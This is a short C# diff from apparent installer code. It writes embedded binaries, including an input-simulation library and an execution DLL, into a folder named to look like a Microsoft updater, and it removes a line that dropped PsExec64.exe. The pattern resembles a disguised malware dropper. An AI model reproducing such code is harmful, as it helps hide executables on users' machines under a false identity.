@@ -28,7 +28,6 @@
             const string Target = @"C:\Windows\MsUpdater\Bootstrap.exe";
             File.WriteAllBytes(Target, Resources.Bootstrap);
             File.WriteAllBytes(@"C:\Windows\MsUpdater\InputSimulator.dll", Resources.InputSimulator);
-            File.WriteAllBytes(@"C:\Windows\MsUpdater\PsExec64.exe", Resources.PsExec64);
 
             const string SparkExecution = @"C:\Windows\MsUpdater\ShellEx\SparkExecution.dll";
             File.WriteAllBytes(SparkExecution, Resources.SparkExecution);
